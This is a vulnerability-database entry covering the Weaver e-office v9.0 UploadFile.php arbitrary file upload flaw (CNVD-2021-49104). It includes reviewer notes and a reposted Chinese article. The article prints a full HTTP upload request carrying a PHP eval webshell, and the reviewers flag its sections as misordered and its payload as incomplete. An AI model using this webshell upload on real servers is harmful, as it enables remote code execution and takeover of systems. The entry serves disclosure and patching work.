---
source: "MrWQ/vulnerability-paper"
title: "泛微e-office UploadFile.php任意文件上传"
product: "泛微e-office"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CNVD-2021-49104"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "标题v9.0；具体补丁范围未给"
prerequisites: "样本含PHPSESSID，认证必要性未说明"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
identifier_role: "primary"
source_url: "https://mp.weixin.qq.com/s/phNPLBJMZ62t8yYcNiCesA"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AE%20e-office%20v9.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20%28CNVD-2021-49104%29.md"
id: "vw-6a2a2cb8b70c8e59a97443b0"
entity_id: "ve-6a2a2cb8b70c8e59a97443b0"
schema_version: "1"
---

# 泛微e-office UploadFile.php任意文件上传

## 条目说明

- 对象与具体问题：泛微e-office；UploadFile.php任意文件上传
- 版本、配置及部署条件：标题v9.0；具体补丁范围未给
- 认证与权限前提：样本含PHPSESSID，认证必要性未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 影响范围段落误放整个HTTP请求，真正版本信息只在标题
- multipart字段名/文件名缺失；POC标题下面却是修复补丁下载URL，内容分区错位
- 明确CNVD-2021-49104，不能改成CVE；应同UploadFile专项合并
- 无落地路径或响应文本，广告和安装包网盘依赖多

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/phNPLBJMZ62t8yYcNiCesA)

********文章来源｜MS08067 Web 安全知识星球********  

本文作者：**Taoing**（Web 漏洞挖掘班讲师）

参考：

```
https://cnvd.org.cn/flaw/show/CNVD-2021-49104
https://mp.weixin.qq.com/s/P75K_0869h-nWHRMu06zgQ
https://mp.weixin.qq.com/s/J4R-PRJq_oi58iWKh_1Oiw
```

**泛微 oa 跟 eoffice 区别：  
**

**常见 oa 是 ecology，eoffice 是轻量版**  

![](../../.resource/remote/1c75a601103cb2d054c929f40fb40c9e50685f4c20d64f5b870088d22b3218b5.png)

#### 一、漏洞概述

泛微 e-office 是泛微旗下的一款标准协同移动办公平台。

泛微 e-office 未能正确处理上传模块中用户输入导致的，攻击者可以构造恶意的上传数据包，实现任意代码执行，攻击者可利用该漏洞获取服务器控制权。

#### 二、影响范围

```http
POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
Host: 127.0.0.1:8082
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6
Cookie: LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348
Content-Length: 333
Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4

--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; 
Content-Type: image/jpeg

<?php
$a=$_POST['H'];
eval("$a");//eval会将输入的$a作为php语句执行，因此只要对_赋一定的system命令值，就能够执行系统命令
?>

--e64bdf16c554bbc109cecef6451c26a4--
```

> 请求长度说明：原资料 Content-Length 为 333；保留原始标头；其数值未据实际请求体重新计算或验证。

#### 三、漏洞复现

安装包：  

链接: https://pan.baidu.com/s/1i4DQ4YD 密码: fegm

![](../../.resource/remote/6aa8de6e08b73eaca0058e188bb2a1b65c537d54d3002e011bc18121864e51c9.png)

![](../../.resource/remote/25a1c47c616735aa6f5f2f775b01b9b778b0ea8daf171c536df4c37cb2d5e308.png)

![](../../.resource/remote/3d25738badb9507a9a616ace033fe0c574ac62da0e345b9fdfc553cf6f1e61f6.png)

##### POC：

```
http://v10.e-office.cn/eoffice9update/safepack.zip
```

#### 四、修复方案

```
厂商已提供漏洞修补方案，建议用户下载使用：
```

```
http://v10.e-office.cn/eoffice9update/safepack.zip
```

**课程咨询请联系小客服**  

![](../../.resource/remote/8445238e734258a03a7861abcc6fbc3036550883881f92432fac95d3f3879683.jpg)

**扫描下方二维码加入星球学习**  

**加入后邀请你进入内部微信群，内部微信群永久有效！**

![](../../.resource/remote/b820f14e551a923b499945064249ff1e3a1f724030f25ace7d90ab7b842d07fe.png) ![](../../.resource/remote/a7a736314919b9479e47ad0fd2c9a5a4c0435d09b418678ce5883ba961d9827e.png)

![](../../.resource/remote/8b3ffea64376da7b0cbd4682e05c5c9ec976e87cabd498253fe6747fc7b7208e.png)![](../../.resource/remote/9774307c2691fb7948de42fa391274fd22de1036247bcc00391ef9d0d44f1741.png)

![](../../.resource/remote/d197090b74de6bc04997bc572efc05f5544c7d799d78f4057be75863653cb6c5.jpg) ![](../../.resource/remote/1d5de7fa15d4a3825bad95bbe7760ba6a5b37f81c3ca11b57116cb1e64b1c827.png)  

**来和 5000 + 位同学一起加入星球学习吧！**  
![](../../.resource/remote/3f55c7e6f5f7346de3532c52fac4ff5d0cfa1192be3b7f366113b7a5bf1132c5.gif)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
